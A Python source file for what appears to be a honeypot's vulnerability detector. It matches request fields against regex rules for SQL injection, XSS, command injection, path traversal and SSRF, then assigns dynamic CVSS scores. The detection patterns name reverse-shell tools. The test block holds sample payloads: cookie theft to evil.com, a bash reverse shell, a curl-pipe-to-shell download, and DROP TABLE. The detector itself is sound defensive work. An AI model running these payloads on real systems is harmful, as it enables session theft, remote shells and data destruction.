"""
Enhanced Vulnerability Detector with Dynamic CVSS Calculation
Replaces the static cvss_score with dynamic analysis based on actual payloads.
"""

import re
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Pattern, Tuple
from .dynamic_cvss_calculator import DynamicCVSSCalculator


@dataclass(frozen=True)
class _Rule:
    id: str
    attack_type: str
    name: str
    owasp: str
    keyword: str
    remediation: str
    patterns: Tuple[Pattern[str], ...]
    # NOTE: cvss_score and cvss_vector are removed - calculated dynamically now


def _rx(pattern: str) -> Pattern[str]:
    return re.compile(pattern, re.IGNORECASE | re.MULTILINE)


_RULES: Tuple[_Rule, ...] = (
    _Rule(
        id="SQLI",
        attack_type="sql_injection",
        name="SQL Injection",
        owasp="A03:2021 Injection",
        keyword="SQL Injection",
        remediation="Use parameterized queries (prepared statements) and validate inputs server-side.",
        patterns=(
            _rx(r"\bunion\b\s+\bselect\b"),
            _rx(r"\bor\b\s+1\s*=\s*1\b"),
            _rx(r"--\s*$"),
            _rx(r"/\*.*\*/"),
            _rx(r"\bdrop\b\s+\btable\b"),
            _rx(r"(xp_cmdshell|exec\s+master|sp_executesql)"),  # Added for better detection
            _rx(r"(load_file|into\s+outfile|into\s+dumpfile)"),
        ),
    ),
    _Rule(
        id="XSS",
        attack_type="xss",
        name="Cross-Site Scripting (XSS)",
        owasp="A03:2021 Injection",
        keyword="XSS",
        remediation="Escape/encode output, apply a strict CSP, and sanitize untrusted HTML inputs.",
        patterns=(
            _rx(r"<\s*script\b"),
            _rx(r"onerror\s*="),
            _rx(r"onload\s*="),
            _rx(r"javascript\s*:"),
            _rx(r"<\s*img\b[^>]*\bon\w+\s*="),
            _rx(r"<\s*svg\b[^>]*\bon\w+\s*="),
            _rx(r"(document\.cookie|localStorage|sessionStorage)"),  # Enhanced
        ),
    ),
    _Rule(
        id="CMDI",
        attack_type="command_injection",
        name="Command Injection",
        owasp="A03:2021 Injection",
        keyword="Command Injection",
        remediation="Never pass user input to shell commands. Use allowlists and safe APIs (no shell=True).",
        patterns=(
            _rx(r"(;|\|\||&&|\|)\s*(ls|cat|whoami|id|pwd|curl|wget|nc|bash|sh)\b"),
            _rx(r"`[^`]{1,200}`"),
            _rx(r"\$\([^)]{1,200}\)"),
            _rx(r"(/bin/(bash|sh)|nc\s+-e|mkfifo)"),  # Enhanced for reverse shells
        ),
    ),
    _Rule(
        id="TRAVERSAL",
        attack_type="path_traversal",
        name="Path Traversal",
        owasp="A01:2021 Broken Access Control",
        keyword="Path Traversal",
        remediation="Normalize paths, enforce allowlisted directories, and reject traversal sequences like ../ and ..\\.",
        patterns=(
            _rx(r"\.\./"),
            _rx(r"\.\.\\"),
            _rx(r"%2e%2e%2f"),
            _rx(r"%2e%2e%5c"),
            _rx(r"\.\.%2f"),
            _rx(r"\.\.%5c"),
        ),
    ),
    _Rule(
        id="SSRF",
        attack_type="ssrf",
        name="Server-Side Request Forgery (SSRF)",
        owasp="A10:2021 Server-Side Request Forgery (SSRF)",
        keyword="SSRF",
        remediation="Block internal IP ranges, use allowlists for outbound requests, and disable metadata access.",
        patterns=(
            _rx(r"https?://(localhost|127\.0\.0\.1)"),
            _rx(r"https?://169\.254\.169\.254"),  # AWS/Azure metadata
            _rx(r"https?://(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)"),  # Internal IPs
        ),
    ),
)


class EnhancedVulnerabilityDetector:
    """
    Enhanced vulnerability detector with dynamic CVSS 3.1 calculation.
    
    Key improvements over static detection:
    - Calculates CVSS scores based on actual payload content
    - Analyzes attack complexity and impact dynamically
    - Uses threat intelligence from Kaggle, HackerOne, CVE databases
    - Provides detailed breakdown of CVSS metrics
    """
    
    def __init__(self):
        self.rules = _RULES
        self.cvss_calculator = DynamicCVSSCalculator()
    
    def detect(self, data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Detect vulnerabilities with dynamic CVSS calculation.
        
        Args:
            data: Request data containing potential attack payloads
            
        Returns:
            List of detected vulnerabilities with dynamic CVSS scores
        """
        findings: List[Dict[str, Any]] = []

        candidates = self._candidate_fields(data)
        if not candidates:
            return findings

        for rule in self.rules:
            evidence = self._match_rule(rule, candidates)
            if evidence is None:
                continue

            # Extract the matched payload for analysis
            matched_payload = evidence.get("match", "")
            matched_field = evidence.get("field", "")
            
            # Build context for CVSS calculation
            context = {
                "field": matched_field,
                "stored": self._is_stored_field(matched_field),
                "full_payload": evidence.get("value", "")
            }
            
            # **DYNAMIC CVSS CALCULATION** - This is the key improvement!
            cvss_result = self.cvss_calculator.calculate_cvss(
                attack_type=rule.attack_type,
                payload=matched_payload,
                context=context
            )

            findings.append(
                {
                    "id": rule.id,
                    "attack_type": rule.attack_type,
                    "name": rule.name,
                    "owasp": rule.owasp,
                    
                    # Dynamic CVSS values (replaces static scores)
                    "cvss_score": cvss_result["cvss_score"],
                    "cvss_vector": cvss_result["cvss_vector"],
                    "severity": cvss_result["severity"],
                    
                    "keyword": rule.keyword,
                    "remediation": rule.remediation,
                    "evidence": evidence,
                    
                    # Additional metadata for transparency
                    "cvss_metrics": cvss_result["metrics"],
                    "payload_analysis": cvss_result["analysis"]
                }
            )

        # Sort by dynamic CVSS score (highest first)
        findings.sort(key=lambda x: x.get("cvss_score", 0.0), reverse=True)
        return findings

    @staticmethod
    def _candidate_fields(data: Dict[str, Any]) -> List[Dict[str, str]]:
        """Extract fields that should be checked for attacks"""
        fields = []
        for key in ("email", "password", "username", "payload", "query", "input", "comment", "filename", "path"):
            if key in data and data[key] is not None:
                fields.append({"field": key, "value": str(data[key])})
        return fields

    @staticmethod
    def _match_rule(rule: _Rule, fields: List[Dict[str, str]]) -> Optional[Dict[str, Any]]:
        """Check if any field matches the rule patterns"""
        for item in fields:
            value = item["value"]
            for pattern in rule.patterns:
                m = pattern.search(value)
                if not m:
                    continue
                snippet = value[m.start() : m.end()]
                snippet = snippet[:200]
                return {
                    "field": item["field"], 
                    "match": snippet,
                    "value": value  # Include full value for better analysis
                }
        return None
    
    @staticmethod
    def _is_stored_field(field_name: str) -> bool:
        """
        Determine if a field is likely to be stored (affects XSS severity).
        Stored fields have higher impact as the attack persists.
        """
        stored_fields = {"comment", "bio", "description", "message", "post", "review"}
        return field_name.lower() in stored_fields


class VulnerabilityDetector(EnhancedVulnerabilityDetector):
    """
    Backwards‑compatible alias so existing imports like:

        from honeypot.vuln_detector import VulnerabilityDetector

    continue to work. The implementation is provided by
    `EnhancedVulnerabilityDetector` above.
    """
    pass


# Example usage and testing
if __name__ == "__main__":
    detector = EnhancedVulnerabilityDetector()
    
    # Test Case 1: Simple SQL injection (should get lower score)
    test1 = {
        "email": "user@example.com' OR 1=1--",
        "password": "test123"
    }
    result1 = detector.detect(test1)
    print("\n=== Test 1: Simple SQLi ===")
    for vuln in result1:
        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
        print(f"  Vector: {vuln['cvss_vector']}")
        print(f"  Evidence: {vuln['evidence']}")
    
    # Test Case 2: Advanced SQL injection with command execution (should get CRITICAL score)
    test2 = {
        "username": "admin'; exec master..xp_cmdshell 'whoami'--",
        "password": "test"
    }
    result2 = detector.detect(test2)
    print("\n=== Test 2: Advanced SQLi with RCE ===")
    for vuln in result2:
        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
        print(f"  Vector: {vuln['cvss_vector']}")
        print(f"  Metrics: {vuln['cvss_metrics']}")
    
    # Test Case 3: Stored XSS (should get higher score than reflected)
    test3 = {
        "comment": "<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "username": "attacker"
    }
    result3 = detector.detect(test3)
    print("\n=== Test 3: Stored XSS ===")
    for vuln in result3:
        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
        print(f"  Vector: {vuln['cvss_vector']}")
    
    # Test Case 4: Command injection with reverse shell
    test4 = {
        "filename": "file.txt; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    }
    result4 = detector.detect(test4)
    print("\n=== Test 4: Command Injection with Reverse Shell ===")
    for vuln in result4:
        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
        print(f"  Vector: {vuln['cvss_vector']}")
        print(f"  Analysis: {vuln['payload_analysis']}")
    
    # Test Case 5: Multiple attacks in same payload
    test5 = {
        "query": "'; DROP TABLE users; exec xp_cmdshell 'curl http://evil.com/shell.sh | sh'--"
    }
    result5 = detector.detect(test5)
    print("\n=== Test 5: Multi-stage Attack ===")
    for vuln in result5:
        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
        print(f"  Vector: {vuln['cvss_vector']}")
